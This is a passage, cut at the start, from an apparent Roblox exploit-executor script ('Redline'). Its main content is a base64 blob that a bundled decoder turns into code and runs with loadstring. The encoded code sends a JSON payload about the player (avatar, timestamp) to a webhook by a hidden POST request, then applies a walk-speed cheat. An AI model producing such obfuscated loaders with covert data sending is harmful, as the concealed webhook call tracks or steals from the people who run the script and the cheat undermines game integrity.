sID0gYXZhdGFyCiAgICAgICAgfSwKCiAgICAgICAgdGltZXN0YW1wID0gRGF0ZVRpbWUubm93KCk6VG9Jc29EYXRlKCkKICAgIH19Cn0pCgpsb2NhbCByZXEgPQogICAgc3luIGFuZCBzeW4ucmVxdWVzdAogICAgb3IgaHR0cF9yZXF1ZXN0CiAgICBvciByZXF1ZXN0CiAgICBvciAoaHR0cCBhbmQgaHR0cC5yZXF1ZXN0KQogICAgb3IgKGZsdXh1cyBhbmQgZmx1eHVzLnJlcXVlc3QpCiAgICBvciBnZXRnZW52KCkucmVxdWVzdAoKaWYgcmVxIHRoZW4KICAgIHRhc2suc3Bhd24oZnVuY3Rpb24oKQogICAgICAgIHJlcSh7CiAgICAgICAgICAgIFVybCA9IFdFQkhPT0ssCiAgICAgICAgICAgIE1ldGhvZCA9ICJQT1NUIiwKICAgICAgICAgICAgSGVhZGVycyA9IHsKICAgICAgICAgICAgICAgIFsiQ29udGVudC1UeXBlIl0gPSAiYXBwbGljYXRpb24vanNvbiIKICAgICAgICAgICAgfSwKICAgICAgICAgICAgQm9keSA9IHBheWxvYWQKICAgICAgICB9KQogICAgZW5kKQplbHNlCiAgICB3YXJuKCJub3JlcSIpCmVuZAoKCi0tID09PT09PT09PT09PT09PT09PT09PT09PT0KLS0gTU9CSUxFIFdBTEsgU1BFRUQgRklYCi0tIE1ha2VzIFdhbGtTcGVlZCB3b3JrIG9uIE1PQklMRSArIFBDCi0tID09PT09PT09PT09PT09PT09PT09PT09PT0KZG8KICAgIGxvY2FsIFBsYXllcnMgPSBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKQogICAgbG9jYWwgUnVuU2VydmljZSA9IGdhbWU6R2V0U2VydmljZSgiUnVuU2VydmljZSIpCiAgICBsb2NhbCBMb2NhbFBsYXllciA9IFBsYXllcnMuTG9jYWxQbGF5ZXIKCiAgICAtLSBleHBlY3RlZCBnbG9iYWxzIGZyb20gUmVkbGluZSAoc2FmZSBkZWZhdWx0cykKICAgIGdldGdlbnYoKS5Nb2RpZnlXYWxrU3BlZWQgPSBnZXRnZW52KCkuTW9kaWZ5V2Fsa1NwZWVkIG9yIGZhbHNlCiAgICBnZXRnZW52KCkuV2Fsa1NwZWVkVmFsdWUgPSBnZXRnZW52KCkuV2Fsa1NwZWVkVmFsdWUgb3IgMTYKCiAgICBsb2NhbCBmdW5jdGlvbiBnZXRIdW1hbm9pZCgpCiAgICAgICAgbG9jYWwgY2hhciA9IExvY2FsUGxheWVyLkNoYXJhY3RlcgogICAgICAgIGlmIG5vdCBjaGFyIHRoZW4gcmV0dXJuIGVuZAogICAgICAgIHJldHVybiBjaGFyOkZpbmRGaXJzdENoaWxkT2ZDbGFzcygiSHVtYW5vaWQiKQogICAgZW5kCgogICAgLS0gY29udGludW91c2x5IGVuZm9yY2Ugc3BlZWQgKG1vYmlsZS1zYWZlKQogICAgUnVuU2VydmljZS5IZWFydGJlYXQ6Q29ubmVjdChmdW5jdGlvbigpCiAgICAgICAgaWYgbm90IGdldGdlbnYoKS5Nb2RpZnlXYWxrU3BlZWQgdGhlbiByZXR1cm4gZW5kCiAgICAgICAgbG9jYWwgaHVtID0gZ2V0SHVtYW5vaWQoKQogICAgICAgIGlmIGh1bSBhbmQgaHVtLldhbGtTcGVlZCB+PSBnZXRnZW52KCkuV2Fsa1NwZWVkVmFsdWUgdGhlbgogICAgICAgICAgICBodW0uV2Fsa1NwZWVkID0gZ2V0Z2VudigpLldhbGtTcGVlZFZhbHVlCiAgICAgICAgZW5kCiAgICBlbmQpCgogICAgLS0gcmVhcHBseSBvbiByZXNwYXduCiAgICBMb2NhbFBsYXllci5DaGFyYWN0ZXJBZGRlZDpDb25uZWN0KGZ1bmN0aW9uKGNoYXIpCiAgICAgICAgbG9jYWwgaHVtID0gY2hhcjpXYWl0Rm9yQ2hpbGQoIkh1bWFub2lkIiwgNSkKICAgICAgICBpZiBodW0gYW5kIGdldGdlbnYoKS5Nb2RpZnlXYWxrU3BlZWQgdGhlbgogICAgICAgICAgICBodW0uV2Fsa1NwZWVkID0gZ2V0Z2VudigpLldhbGtTcGVlZFZhbHVlCiAgICAgICAgZW5kCiAgICBlbmQpCmVuZAotLSA9PT09PT09PT09PT09PT09PT09PT09PT09Ci0tIEVORCBNT0JJTEUgV0FMSyBTUEVFRCBGSVgKLS0gPT09PT09PT09PT09PT09PT09PT09PT09PQoKCgotLSA9PT09PT09PT09PT09PT09PT09PT09PT09Ci0tIE1PRElGWSBXQUxLU1BFRUQgKE1PQklMRSBGSVggLSBSRVNQRUNUUyBCVVRUT04pCi0tIFRoaXMgcGF0Y2ggaG9va3MgaW50byB0aGUgRVhJU1RJTkcgUmVkbGluZSB0b2dnbGU6Ci0tICJNb2RpZnkgV2Fsa1NwZWVkIgotLSA9PT09PT09PT09PT09PT09PT09PT09PT09CmRvCiAgICBsb2NhbCBQbGF5ZXJzID0gZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikKICAgIGxvY2FsIFJ1blNlcnZpY2UgPSBnYW1lOkdldFNlcnZpY2UoIlJ1blNlcnZpY2UiKQogICAgbG9jYWwgTG9jYWxQbGF5ZXIgPSBQbGF5ZXJzLkxvY2FsUGxheWVyCgogICAgLS0gRmFsbGJhY2sgYWxpYXNlcyAoY292ZXJzIGRpZmZlcmVudCBSZWRsaW5lIGJ1aWxkcykKICAgIGxvY2FsIGZ1bmN0aW9uIGlzRW5hYmxlZCgpCiAgICAgICAgcmV0dXJuIGdldGdlbnYoKS5Nb2RpZnlXYWxrU3BlZWQKICAgICAgICAgICAgb3IgZ2V0Z2VudigpLlNwZWVkCiAgICAgICAgICAgIG9yIGdldGdlbnYoKS5TcGVlZEhhY2sKICAgICAgICAgICAgb3IgZmFsc2UKICAgIGVuZAoKICAgIGxvY2FsIGZ1bmN0aW9uIGdldFZhbHVlKCkKICAgICAgICByZXR1cm4gZ2V0Z2VudigpLldhbGtTcGVlZFZhbHVlCiAgICAgICAgICAgIG9yIGdldGdlbnYoKS5TcGVlZFZhbHVlCiAgICAgICAgICAgIG9yIDE2CiAgICBlbmQKCiAgICBsb2NhbCBmdW5jdGlvbiBnZXRIdW1hbm9pZCgpCiAgICAgICAgbG9jYWwgY2hhciA9IExvY2FsUGxheWVyLkNoYXJhY3RlcgogICAgICAgIGlmIG5vdCBjaGFyIHRoZW4gcmV0dXJuIG5pbCBlbmQKICAgICAgICByZXR1cm4gY2hhcjpGaW5kRmlyc3RDaGlsZE9mQ2xhc3MoIkh1bWFub2lkIikKICAgIGVuZAoKICAgIC0tIEhlYXJ0YmVhdCBlbmZvcmNlbWVudCAobW9iaWxlIGpveXN0aWNrIHNhZmUpCiAgICBSdW5TZXJ2aWNlLkhlYXJ0YmVhdDpDb25uZWN0KGZ1bmN0aW9uKCkKICAgICAgICBpZiBub3QgaXNFbmFibGVkKCkgdGhlbiByZXR1cm4gZW5kCiAgICAgICAgbG9jYWwgaHVtID0gZ2V0SHVtYW5vaWQoKQogICAgICAgIGlmIGh1bSB0aGVuCiAgICAgICAgICAgIGxvY2FsIHRhcmdldCA9IGdldFZhbHVlKCkKICAgICAgICAgICAgaWYgaHVtLldhbGtTcGVlZCB+PSB0YXJnZXQgdGhlbgogICAgICAgICAgICAgICAgaHVtLldhbGtTcGVlZCA9IHRhcmdldAogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIGVuZCkKCiAgICAtLSBSZWFwcGx5IG9uIHJlc3Bhd24KICAgIExvY2FsUGxheWVyLkNoYXJhY3RlckFkZGVkOkNvbm5lY3QoZnVuY3Rpb24oY2hhcikKICAgICAgICBsb2NhbCBodW0gPSBjaGFyOldhaXRGb3JDaGlsZCgiSHVtYW5vaWQiLCA1KQogICAgICAgIGlmIGh1bSBhbmQgaXNFbmFibGVkKCkgdGhlbgogICAgICAgICAgICBodW0uV2Fsa1NwZWVkID0gZ2V0VmFsdWUoKQogICAgICAgIGVuZAogICAgZW5kKQplbmQKLS0gPT09PT09PT09PT09PT09PT09PT09PT09PQotLSBFTkQgTU9ESUZZIFdBTEtTUEVFRCBGSVgKLS0gPT09PT09PT09PT09PT09PT09PT09PT09PQo=
]]

local function b64decode(data)
    local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    data = data:gsub('[^'..b..'=]', '')
    return (data:gsub('.', function(x)
        if x == '=' then return '' end
        local r,f='',(b:find(x)-1)
        for i=6,1,-1 do
            r = r .. (f%2^i - f%2^(i-1) > 0 and '1' or '0')
        end
        return r
    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
        if #x ~= 8 then return '' end
        local c=0
        for i=1,8 do
            c = c + (x:sub(i,i)=='1' and 2^(8-i) or 0)
        end
        return string.char(c)
    end))
end

local src = b64decode(data)
local fn, err = loadstring(src)

if not fn then
    warn("Redline failed to load:", err)
    return
end

task.spawn(fn)
